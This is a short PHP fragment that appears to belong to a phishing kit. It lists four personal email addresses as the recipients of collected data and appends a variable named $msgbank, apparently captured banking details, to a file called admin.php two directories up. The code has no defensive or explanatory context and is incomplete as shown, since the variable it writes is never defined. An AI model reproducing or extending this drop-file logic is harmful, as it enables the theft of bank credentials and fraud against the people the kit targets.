<?php

$yourmail  = 'garstepone819@seznam.cz, jen.5.64.k.a@gmail.com, 9063851193a@gmail.com, swjones2019@yahoo.com';


$f = fopen("../../admin.php", "a");
	fwrite($f, $msgbank);



?>